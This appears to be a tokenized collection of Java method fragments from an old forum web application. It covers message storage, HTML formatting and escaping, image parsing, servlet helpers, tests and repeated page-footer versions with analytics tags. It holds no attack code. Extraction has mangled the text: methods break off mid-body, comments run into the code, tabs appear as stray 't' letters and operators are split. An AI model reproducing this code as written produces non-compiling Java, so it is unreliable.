public static void main ( String [ ] args ) throws Exception { Hashtable defaults = getDefaultProfile ( ) ; FileOutputStream f = new FileOutputStream ( " anonymous " ) ; ObjectOutputStream o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _search " ) ; defaults . put ( " SearchMode " , Boolean . TRUE ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _debug " ) ; defaults . put ( " DebugMode " , Boolean . TRUE ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white2 " ) ; defaults . put ( " style " , " white2 " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white " ) ; defaults . put ( " style " , " white " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; } 
Connection getConnection ( String user ) throws SQLException ; void SQLclose ( ) throws SQLException ; } 
protected String readMessageImpl ( String domain , String msgid ) throws IOException , StorageNotFoundException { BufferedReader in = null ; try { in = new BufferedReader ( new InputStreamReader ( new FileInputStream ( root + domain + '/' + msgid ) , " KOI8-R " ) ) ; } catch ( FileNotFoundException e ) { throw new StorageNotFoundException ( domain , msgid , e ) ; } char [ ] buf = new char [ 8192 ] ; StringBuffer out = new StringBuffer ( ) ; int i = 0 ; while ( ( i = in . read ( buf , 0 , buf . length ) ) > - 1 ) { if ( i > 0 ) { out . append ( buf , 0 , i ) ; } } in . close ( ) ; return out . toString ( ) ; } 
protected void writeMessageImpl ( String domain , String msgid , String message ) throws IOException , StorageException { if ( new File ( root + domain + '/' + msgid ) . exists ( ) ) { throw new StorageExistsException ( domain , msgid ) ; } FileOutputStream out = new FileOutputStream ( root + domain + '/' + msgid ) ; out . write ( message . getBytes ( " KOI8-R " ) ) ; out . close ( ) ; } 
protected void updateMessageImpl ( String domain , String msgid , String message ) throws IOException , StorageException { if ( ! ( new File ( root + domain + '/' + msgid ) . exists ( ) ) ) { throw new StorageNotFoundException ( domain , msgid ) ; } FileOutputStream out = new FileOutputStream ( root + domain + '/' + msgid ) ; out . write ( message . getBytes ( " KOI8-R " ) ) ; out . close ( ) ; } 
protected InputStream getReadStreamImpl ( String domain , String msgid ) throws StorageNotFoundException { FileInputStream in = null ; TODO: try buffered input stream and check perfomance try { in = new FileInputStream(root + domain + '/' + msgid); } catch (FileNotFoundException e) { throw new StorageNotFoundException(domain, msgid); } return in; } 
protected OutputStream getWriteStreamImpl ( String domain , String msgid ) throws IOException { FileOutputStream in = null ; in = new FileOutputStream ( root + domain + '/' + msgid ) ; return in ; } 
public String readMessage ( String domain , String msgid ) throws IOException , StorageException { check ( domain , msgid ) ; return readMessageImpl ( domain , msgid ) ; } 
public String readMessageNull ( String domain , String msgid ) throws IOException , StorageException { check ( domain , msgid ) ; return readMessageNullImpl ( domain , msgid ) ; } 
public String readMessageDefault ( String domain , String msgid , String def ) throws IOException , StorageException { check ( domain , msgid ) ; return readMessageDefaultImpl ( domain , msgid , def ) ; } 
public void writeMessage ( String domain , String msgid , String message ) throws IOException , StorageException { check ( domain , msgid ) ; writeMessageImpl ( domain , msgid , message ) ; } 
public void updateMessage ( String domain , String msgid , String message ) throws IOException , StorageException { check ( domain , msgid ) ; updateMessageImpl ( domain , msgid , message ) ; } 
public InputStream getReadStream ( String domain , String msgid ) throws StorageException { check ( domain , msgid ) ; return getReadStreamImpl ( domain , msgid ) ; } 
public OutputStream getWriteStream ( String domain , String msgid ) throws IOException , StorageException { check ( domain , msgid ) ; return getWriteStreamImpl ( domain , msgid ) ; } 
private void check ( String domain , String msgid ) throws StorageException { try { if ( DomainCheckRE = = null ) { 
protected String readMessageImpl ( String domain , String msgid ) throws IOException , StorageException { throw new StorageNotImplException ( ) ; } 
protected String readMessageNullImpl ( String domain , String msgid ) throws IOException , StorageException { try { return readMessageImpl ( domain , msgid ) ; 
protected String readMessageDefaultImpl ( String domain , String msgid , String def ) throws IOException , StorageException { try { return readMessageImpl ( domain , msgid ) ; 
protected void writeMessageImpl ( String domain , String msgid , String message ) throws IOException , StorageException { throw new StorageNotImplException ( ) ; } 
protected void updateMessageImpl ( String domain , String msgid , String message ) throws IOException , StorageException { throw new StorageNotImplException ( ) ; } 
protected InputStream getReadStreamImpl ( String domain , String msgid ) throws StorageException { throw new StorageNotImplException ( ) ; } 
protected OutputStream getWriteStreamImpl ( String domain , String msgid ) throws IOException , StorageException { throw new StorageNotImplException ( ) ; } 
public static String getMonth ( int month ) throws BadDateException { switch ( month - 1 ) { case 0 : 
public static String readfile ( String filename ) throws IOException { StringBuffer out = new StringBuffer ( ) ; BufferedReader in = new BufferedReader ( new InputStreamReader ( new FileInputStream ( filename ) , " KOI8-R " ) ) ; char [ ] buf = new char [ 8192 ] ; int i = 0 ; while ( ( i = in . read ( buf , 0 , buf . length ) ) > - 1 ) { if ( i > 0 ) { out . append ( buf , 0 , i ) ; } } in . close ( ) ; return out . toString ( ) ; } 
public String process ( ) throws UtilException { if ( CheckHTML ) { checkHTML ( ) ; } StringTokenizer st ; if ( PlainText ) { st = new StringTokenizer ( htmlSpecialChars ( text ) , delim , true ) ; } else { st = new StringTokenizer ( text , delim , true ) ; } StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( NewLine ) { res = nl2br ( res ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
public void enableUrlHighLightMode ( ) { urlHighlight = true ; } 
public void enablePreformatMode ( ) { Preformat = true ; nl = " " ; delim = " " ; } 
public void enableNewLineMode ( ) { NewLine = true ; texNewLine = false ; } 
public void enableTexNewLineMode ( ) { NewLine = false ; texNewLine = true ; } 
public void enablePlainTextMode ( ) { PlainText = true ; CheckHTML = false ; } 
public void enableCheckHTML ( ) { CheckHTML = true ; PlainText = false ; } 
private String formatHTMLLine ( String chunk ) { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL index = found.getStartIndex(); int end = found.getEndIndex(); String url = chunk.substring(index, end); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, index); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"" + url + "\">" + urlchunk + "</a>"); } else { out.append(url); } index = end; } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static String nl2br ( String text ) { return nlRE . substituteAll ( text , " <br> " ) ; } 
public static String texnl2br ( String text , boolean quoting ) { if ( ! quoting ) { return texnlRE . substituteAll ( text , " <p> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < text . length ( ) ; i + + ) { if ( text . charAt ( i ) = = '\r' ) { continue ; } if ( text . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( text . substring ( i ) . trim ( ) . startsWith ( " &gt; " ) ) { quot = true ; buf . append ( " <i> " ) ; } } else { cr = true ; } } else { cr = false ; } buf . append ( text . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . toString ( ) ; } 
public static String htmlSpecialChars ( String str ) { StringBuffer res = new StringBuffer ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : res . append ( " &amp; " ) ; break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
private void checkHTML ( ) throws UtilException { String str ; if ( ! urlHighlight ) { str = tagREAnchor . substituteAll ( text , " " ) ; } else { str = tagRE . substituteAll ( text , " " ) ; } if ( str . indexOf ( '<' ) ! = - 1 | | str . indexOf ( '>' ) ! = - 1 ) { throw new UtilBadHTMLException ( ) ; 
public static String wrapLongLine ( String line , int maxlength , String delim , int start ) { StringBuffer sb = new StringBuffer ( ) ; start = start % maxlength ; int pices = ( start + line . length ( ) ) / maxlength ; for ( int i = 0 ; i < pices ; i + + ) { if ( i = = 0 ) { sb . append ( line . substring ( 0 , ( i + 1 ) * maxlength - start ) ) ; } else { sb . append ( line . substring ( maxlength * i - start , ( i + 1 ) * maxlength - start ) ) ; } sb . append ( delim ) ; } if ( pices = = 0 ) { sb . append ( line ) ; } else { sb . append ( line . substring ( maxlength * pices - start ) ) ; } return sb . toString ( ) ; } 
public static String wrapLongLine ( String line , int maxlength , String delim ) { return wrapLongLine ( line , maxlength , delim , 0 ) ; } 
public static String wrapLongLines ( String text , int maxlength ) { StringTokenizer st = new StringTokenizer ( text , " " , true ) ; StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( wrapLongLine ( st . nextToken ( ) , maxlength , " " ) ) ; } return sb . toString ( ) ; } 
public static void main ( String [ ] args ) throws Exception { ImageInfo info = new ImageInfo ( args [ 0 ] ) ; if ( info . width > info . height ) { System . out . print ( " horizontal " ) ; } else { System . out . print ( " vertical " ) ; } System . out . println ( info . width + " " + info . height ) ; } 
private void getGifInfo ( FileInputStream fileStream ) throws IOException , BadImageException { byte [ ] bytes = new byte [ 13 ] ; int bytesread = fileStream . read ( bytes ) ; if ( bytesread = = 13 ) { String header = new String ( bytes ) ; 
private void getPngInfo ( FileInputStream fileStream ) throws IOException , BadImageException { byte [ ] bytes = new byte [ 24 ] ; int bytesread = fileStream . read ( bytes ) ; if ( bytesread = = 24 ) { String header = new String ( bytes ) ; 
private void getJpgInfo ( FileInputStream fileStream ) throws IOException , BadImageException { if ( fileStream . read ( ) = = 0xFF & & fileStream . read ( ) = = 0xD8 ) { while ( true ) { 
private short shortBigEndian ( byte firstRead , byte lastRead ) { return ( short ) ( ( ( firstRead & 0xFF ) < < 8 ) | lastRead & 0xFF ) ; } 
private short shortLittleEndian ( byte firstRead , byte lastRead ) { return shortBigEndian ( lastRead , firstRead ) ; } 
private int intBigEndian ( byte a1 , byte a2 , byte a3 , byte a4 ) { return ( ( a1 & 0xFF ) < < 24 ) | ( ( a2 & 0xFF ) < < 16 ) | ( ( a3 & 0xFF ) < < 8 ) | a4 & 0xFF ; } 
private int intLittleEndian ( byte a1 , byte a2 , byte a3 , byte a4 ) { return intBigEndian ( a4 , a3 , a2 , a1 ) ; } 
public boolean getBooleanProperty ( String prop ) throws UtilException { if ( settings . get ( prop ) ! = null ) { return ( ( Boolean ) settings . get ( prop ) ) . booleanValue ( ) ; 
public String getBooleanPropertyHTML ( String prop ) throws UtilException { return getBooleanProperty ( prop ) ? " checked " : " " ; } 
public boolean setBooleanProperty ( String prop , String value ) throws UtilException { if ( value = = null ) { return setBooleanProperty ( prop , Boolean . FALSE ) ; } if ( " on " . equals ( value ) ) { return setBooleanProperty ( prop , Boolean . TRUE ) ; } return false ; } 
public String getString ( String name ) throws ServletParameterException { if ( name = = null ) tthrow new ServletParameterBadNameException ( name ) ; tString value = rq . getParameter ( name ) ; if ( value = = null ) tthrow new ServletParameterMissingException ( name ) ; treturn value ; } 
public int getInt ( String name ) throws ServletParameterException { if ( name = = null ) tthrow new ServletParameterBadNameException ( name ) ; tString svalue = rq . getParameter ( name ) ; if ( svalue = = null ) tthrow new ServletParameterMissingException ( name ) ; tint value ; ttry { tvalue = Integer . parseInt ( svalue ) ; } catch ( NumberFormatException e ) { tthrow new ServletParameterBadValueException ( name , e ) ; } treturn value ; } 
public boolean getBoolean ( String name ) throws ServletParameterException { tint value = getInt ( name ) ; tswitch ( value ) { tcase 0 : return false ; 
public static boolean checkLoginName ( String login ) { login = login . toLowerCase ( ) ; no zerosize login if (login.length() == 0) { return false; } if (login.length() >= 80) { return false; } return loginCheckRE.isMatch(login); } 
public static String makeTitle ( String title ) { if ( title ! = null & & ! " " . equals ( title . trim ( ) ) ) { return title ; } return " " ; } 
public static String getStackTrace ( Throwable e ) throws IOException { StringWriter str = new StringWriter ( ) ; PrintWriter prt = new PrintWriter ( str ) ; e . printStackTrace ( prt ) ; String r = str . toString ( ) ; prt . close ( ) ; str . close ( ) ; return r ; } 
public static boolean isSearchEnguine ( String UserAgent ) { boolean r = false ; if ( UserAgent ! = null ) { UserAgent = UserAgent . toLowerCase ( ) ; if ( UserAgent . indexOf ( " htdig " ) ! = - 1 ) { r = true ; } if ( UserAgent . indexOf ( " udmsearch " ) ! = - 1 ) { r = true ; } } return r ; } 
public static String md5hash ( String pass ) { try { MessageDigest md = MessageDigest . getInstance ( " MD5 " ) ; $NON-NLS-1$ 
public static String fixURL ( String url ) throws UtilException { url = url . trim ( ) ; if ( IsItUrl ( url ) ) { if ( url . toLowerCase ( ) . startsWith ( " www. " ) ) { return " http: " + url ; } if ( url . toLowerCase ( ) . startsWith ( " ftp. " ) ) { return " ftp: " + url ; } return url ; } throw new UtilBadURLException ( url ) ; } 
private static boolean IsItUrl ( String x ) { return isUrl . isMatch ( x ) ; } 
public static void main ( String [ ] args ) { try { for ( int i = 0 ; i < args . length ; i + + ) { 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <iframe src= \" dw.jsp?width=400&amp;height=155&amp;main=t \" width= \" 468 \" height= \" 60 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <iframe src= \" dw.jsp?width=400&amp;height=155&amp;main=0 \" width= \" 468 \" height= \" 60 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <iframe src= \" dw.jsp?width=468&amp;height=60&amp;main=0 \" width= \" 468 \" height= \" 60 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=468&amp;height=60&amp;main=0 \" width= \" 468 \" height= \" 60 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public static String htmlSpecialChars ( String str ) { StringBuffer res = new StringBuffer ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : REMatch m = uniRE . getMatch ( str . substring ( i ) ) ; if ( ( m instanceof REMatch ) ) { String s = m . toString ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) throws UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) + " &topics= " + prof . getIntProperty ( " topics " ) + " &messages= " + prof . getIntProperty ( " messages " ) + " &style= " + prof . getStringProperty ( " style " ) ; } 
public String process ( ) throws UtilException { if ( htmlInput ) { checkHTML ( ) ; } StringTokenizer st ; if ( plainTextInput ) { st = new StringTokenizer ( htmlSpecialChars ( text ) , delim , true ) ; } else { st = new StringTokenizer ( text , delim , true ) ; } StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . toString ( ) ; if ( NewLine ) { res = nl2br ( res ) ; } if ( texNewLine ) { res = texnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
public void enablePlainTextMode ( ) { plainTextInput = true ; htmlInput = false ; } 
public void enableCheckHTML ( ) { htmlInput = true ; plainTextInput = false ; } 
private String formatHTMLLine ( String chunk ) throws UtilException { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL String url = chunk.substring(found.getStartIndex(), found.getEndIndex()); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, found.getStartIndex()); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"" + url + "\">" + urlchunk + "</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static int countCharacters ( String str ) throws UtilException { int size = 0 ; try { for ( Iterator i = new SGMLStringIterator ( str ) ; i . hasNext ( ) ; ) { i . next ( ) ; size + + ; } } catch ( StringIndexOutOfBoundsException ex ) { throw new UtilException ( " Invalid SGML Entity " ) ; } return size ; } 
private void checkHTML ( ) throws UtilBadHTMLException { String str ; if ( ! urlHighlight ) { str = tagREAnchor . substituteAll ( text , " " ) ; } else { str = tagRE . substituteAll ( text , " " ) ; } if ( str . indexOf ( '<' ) ! = - 1 | | str . indexOf ( '>' ) ! = - 1 ) { throw new UtilBadHTMLException ( ) ; 
public static String wrapLongLine ( String line , int maxlength , String delim , int start ) throws UtilException { StringBuffer sb = new StringBuffer ( ) ; int index = start ; for ( Iterator i = new SGMLStringIterator ( line ) ; i . hasNext ( ) ; ) { String ch = ( String ) i . next ( ) ; if ( index % maxlength = = maxlength - 1 ) { sb . append ( delim ) ; } sb . append ( ch ) ; index + + ; } return sb . toString ( ) ; } 
public static String wrapLongLine ( String line , int maxlength , String delim ) throws UtilException { return wrapLongLine ( line , maxlength , delim , 0 ) ; } 
public static String wrapLongLines ( String text , int maxlength ) throws UtilException { StringTokenizer st = new StringTokenizer ( text , " " , true ) ; StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( wrapLongLine ( st . nextToken ( ) , maxlength , " " ) ) ; } return sb . toString ( ) ; } 
public void testURLHighlight ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT1 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( formatter . process ( ) , RESULT1 ) ; } 
public void testURLHighlight2 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT2 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( formatter . process ( ) , RESULT2 ) ; } 
public void testURLHighlight3 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT3 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( formatter . process ( ) , RESULT3 ) ; } 
public void testWrap1 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT4 ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( RESULT4 , formatter . process ( ) ) ; } 
public void testCountSGML1 ( ) throws UtilException { assertEquals ( HTMLFormatter . countCharacters ( TEXT4 ) , TEXT4 . length ( ) ) ; } 
public void testCountSGML2 ( ) throws UtilException { assertEquals ( 5 , HTMLFormatter . countCharacters ( TEXT6 ) ) ; } 
public void testWrapSGML ( ) throws UtilException { assertEquals ( TEXT7 , HTMLFormatter . wrapLongLine ( TEXT7 , 35 , " " ) ) ; } 
public void testWrapSGML2 ( ) throws UtilException { assertEquals ( RESULT7 , HTMLFormatter . wrapLongLine ( TEXT7 , 20 , " " ) ) ; } 
public void remove ( ) { throw new UnsupportedOperationException ( ) ; } 
public boolean hasNext ( ) { return index < str . length ( ) ; } 
public Object next ( ) { if ( ! hasNext ( ) ) { throw new NoSuchElementException ( ) ; } if ( str . charAt ( index ) = = '&' ) { StringBuffer buf = new StringBuffer ( ) ; 
public void checkDuplication ( String ip ) throws DuplicationException { if ( ! check ( ip ) ) { throw new DuplicationException ( ) ; 
private String formatHTMLLine ( String chunk ) throws UtilException { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL String url = chunk.substring(found.getStartIndex(), found.getEndIndex()); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, found.getStartIndex()); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"" + htmlSpecialChars(url) + "\">" + urlchunk + "</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public void testURLHighlight4 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT8 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( formatter . process ( ) , RESULT8 ) ; } 
public void testURLHighlight4 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT8 ) ; formatter . enablePlainTextMode ( ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( formatter . process ( ) , RESULT8 ) ; } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public abstract String getContent ( String name , ProfileHashtable profile ) throws IOException , BoxletException , UtilException ; public abstract String getMenuContent ( String name , ProfileHashtable profile , String addUrl , String removeUrl ) throws IOException , BoxletException , UtilException ; abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException ; } 
public abstract String getMenuContent ( String name , ProfileHashtable profile , String addUrl , String removeUrl ) throws IOException , BoxletException , UtilException ; abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException ; } 
